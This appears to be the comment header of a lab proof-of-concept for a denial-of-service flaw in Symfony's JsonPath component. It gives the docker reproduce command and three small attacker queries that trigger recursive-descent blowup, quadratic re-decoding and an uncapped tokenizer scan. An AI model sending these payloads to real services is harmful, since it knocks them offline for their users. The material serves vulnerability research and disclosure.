# VULN-006 — JsonPath attacker-query DoS. Component-level PoC (no HTTP route in the lab;
# the component's documented use case is evaluating a CLIENT-SUPPLIED query).
# The "request" is the attacker-controlled JsonPath query string(s) fed to JsonCrawler::find().
#
# Reproduce exactly (run from exploits/VULN-006/):
#   NO_COLOR=1 ./run.sh
#
# Under the hood it pipes this PHP to the live container's php over stdin:
#
#   docker exec -i \
#     -e JSONPATH_SRC=/src/src/Symfony/Component/JsonPath \
#     -e SIZES_B=500,1000,2000 -e DEPTHS_A=4,5,6 -e SIZES_C=25000,50000,100000 \
#     cvehunterlab_symfony_app php -d memory_limit=256M
#
# The three attacker queries exercised (all tiny), each against a runtime-generated document:
#   (a) recursive-descent explosion :  $..*..*          (7 bytes)  vs a nested tree document
#   (b) O(N^2) per-element re-decode :  $.arr[?@.x==$.y] (16 bytes) vs {"y":-1,"arr":[{"x":0}..{"x":N}]}
#   (c) uncapped tokenizer scan      :  $[?(@.a=="AAAA...(up to 100000)..." && @.a)]  vs {"a":1}
